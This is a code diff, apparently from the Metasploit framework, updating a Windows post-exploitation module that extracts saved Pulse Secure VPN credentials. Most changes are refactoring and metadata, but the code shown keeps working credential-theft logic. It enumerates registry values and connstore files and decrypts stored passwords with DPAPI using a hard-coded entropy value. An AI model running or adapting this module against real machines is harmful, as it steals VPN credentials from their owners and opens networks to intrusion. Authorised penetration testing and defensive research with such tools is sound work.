@@ -35,10 +35,29 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
-        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>']
+        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_railgun_api
+              stdapi_sys_config_getsid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
-
   end
 
   # Decrypts `data` encrypted with Windows DPAPI by calling CryptUnprotectData
@@ -51,7 +70,6 @@ class MetasploitModule < Msf::Post
   #
   def decrypt_reg(data, entropy)
     begin
-      rg = session.railgun
       pid = session.sys.process.getpid
       process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -72,7 +90,7 @@ class MetasploitModule < Msf::Post
         eaddr = [emem].pack('V')
         elen = [entropy.length].pack('V')
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
         len, addr = ret['pDataOut'].unpack('V2')
       else
         # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
@@ -82,7 +100,7 @@ class MetasploitModule < Msf::Post
         eaddr = Rex::Text.pack_int64le(emem)
         elen = Rex::Text.pack_int64le(entropy.length)
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
         p_data = ret['pDataOut'].unpack('VVVV')
         len = p_data[0] + (p_data[1] << 32)
         addr = p_data[2] + (p_data[3] << 32)
@@ -113,7 +131,12 @@ class MetasploitModule < Msf::Post
       ives = {}
       connstore_paths.each do |path|
         next unless session.fs.file.exist?(path)
-        connstore_file = session.fs.file.open(path) rescue nil
+
+        connstore_file = begin
+          session.fs.file.open(path)
+        rescue StandardError
+          nil
+        end
         next if connstore_file.nil?
 
         connstore_data = connstore_file.read.to_s
@@ -153,10 +176,17 @@ class MetasploitModule < Msf::Post
     ]
     begin
       return unless is_system?
+
       paths.each do |path|
         next unless session.fs.file.exist?(path)
-        connstore_file = session.fs.file.open(path) rescue nil
+
+        connstore_file = begin
+          session.fs.file.open(path)
+        rescue StandardError
+          nil
+        end
         next if connstore_file.nil?
+
         connstore_data = connstore_file.read.to_s
         connstore_file.close
 
@@ -201,8 +231,9 @@ class MetasploitModule < Msf::Post
       profiles.each do |profile|
         key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
         next unless key_names
+
         key_names.each do |key_name|
-          ive_index = key_name[4..-1] # remove 'ive:'
+          ive_index = key_name[4..] # remove 'ive:'
           # We get the encrypted password value from registry
           reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
           vals = registry_enumvals(reg_path)
@@ -211,14 +242,14 @@ class MetasploitModule < Msf::Post
 
           vals.each do |val|
             data = registry_getvaldata(reg_path, val)
-            if is_system? and data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
-                # this means data was encrypted by elevated user using LocalSystem scope and fixed
-                # pOptionalEntropy value, adjusting parameters
-                data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
-                entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
+            if is_system? && data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
+              # this means data was encrypted by elevated user using LocalSystem scope and fixed
+              # pOptionalEntropy value, adjusting parameters
+              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
+              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
             else
               # convert IVE index to DPAPI pOptionalEntropy value like PSC does
-              entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack("c*")
+              entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack('c*')
             end
 
             if !data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
@@ -271,6 +302,7 @@ class MetasploitModule < Msf::Post
       print_status('No credentials were found.')
     end
     return unless ives.any?
+
     ives.each do |ive|
       ive['creds'].each do |creds|
         print_good('Account found')
@@ -293,7 +325,7 @@ class MetasploitModule < Msf::Post
           port: uri.port,
           protocol: 'tcp',
           realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-          realm_value: uri.path.blank? ? "/" : uri.path,
+          realm_value: uri.path.blank? ? '/' : uri.path,
           service_name: 'Pulse Secure SSL VPN',
           workspace_id: myworkspace_id
         }
@@ -323,8 +355,8 @@ class MetasploitModule < Msf::Post
   # Array of vulnerable builds branches.
   def vuln_builds
     [
-      [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.5')],
-      [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.4')],
+      [Rex::Version.new('0.0.0'), Rex::Version.new('9.0.5')],
+      [Rex::Version.new('9.1.0'), Rex::Version.new('9.1.4')],
     ]
   end
 
@@ -337,21 +369,25 @@ class MetasploitModule < Msf::Post
     version_path = 'C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini'
     begin
       if !session.fs.file.exist?(version_path)
-        print_error("Pulse Secure Connect client is not installed on this system")
+        print_error('Pulse Secure Connect client is not installed on this system')
         return Msf::Exploit::CheckCode::Safe
       end
-      version_file = session.fs.file.open(version_path) rescue nil
+      version_file = begin
+        session.fs.file.open(version_path)
+      rescue StandardError
+        nil
+      end
       if version_file.nil?
-        print_error("Cannot open Pulse Secure Connect version file.")
+        print_error('Cannot open Pulse Secure Connect version file.')
         return Msf::Exploit::CheckCode::Unknown
       end
       version_data = version_file.read.to_s
       version_file.close
       matches = version_data.scan(/DisplayVersion=([0-9.]+)/m)
-      build = Gem::Version.new(matches[0][0])
+      build = Rex::Version.new(matches[0][0])
       print_status("Target is running Pulse Secure Connect build #{build}.")
-      if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
-        print_good("This version is considered vulnerable.")
+      if vuln_builds.any? { |build_range| Rex::Version.new(build).between?(*build_range) }
+        print_good('This version is considered vulnerable.')
         return Msf::Exploit::CheckCode::Vulnerable
       end
 
@@ -361,8 +397,8 @@ class MetasploitModule < Msf::Post
       end
 
       print_warning("You're executing from an unprivileged process so this version is considered safe.")
-      print_warning("However, there might be leftovers from previous versions in the registry.")
-      print_warning("We recommend running this script in elevated mode to obtain credentials saved by recent versions.")
+      print_warning('However, there might be leftovers from previous versions in the registry.')
+      print_warning('We recommend running this script in elevated mode to obtain credentials saved by recent versions.')
       return Msf::Exploit::CheckCode::Appears
     rescue Rex::Post::Meterpreter::RequestError => e
       vprint_error(e.message)
